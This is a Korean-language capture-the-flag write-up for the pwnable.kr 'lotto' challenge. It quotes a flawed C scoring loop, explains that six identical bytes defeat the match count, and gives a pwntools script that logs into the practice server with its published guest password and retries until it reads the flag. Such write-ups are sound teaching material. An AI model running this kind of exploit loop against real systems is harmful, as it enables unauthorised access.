# [pwnable.kr] lotto

> Mommy! I made a lotto program for my homework.
> do you want to play?
>
> ssh lotto@pwnable.kr -p2222 (pw:guest)
>
> [Attachment](./attachment)

## Bug

```c
/* lotto.c */

	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}
```

점수를 계산할 때 6개의 숫자가 모두 일치하는지 검사하는 것이 아니라, 선택한 각각의 숫자가 정답에 존재하는지 검사한다. 따라서 6개 모두 같은 숫자를 선택하면, 그 숫자가 정답에 존재하기만 하면 6점이 되어 플래그를 획득할 수 있다.

## Exploit

```python
from pwn import *

p = ssh("lotto", "pwnable.kr", 2222, "guest").process("/home/lotto/lotto")

sla = p.sendlineafter
sa = p.sendafter

while True:
    payload = b"\x01" * 6  # choose 6 same numbers
    sla(b"3. Exit\n", b"1")
    sa(b"Submit your 6 lotto bytes : ", payload)

    p.recvuntil(b"Lotto Start!\n")
    result = p.recvline()
    if b"bad luck..." in result:
        continue
    else:
        print(result)
        break

p.interactive()
```

![image](https://github.com/user-attachments/assets/ceb6ae3a-c4a8-4175-8625-402b9dd5db9e)
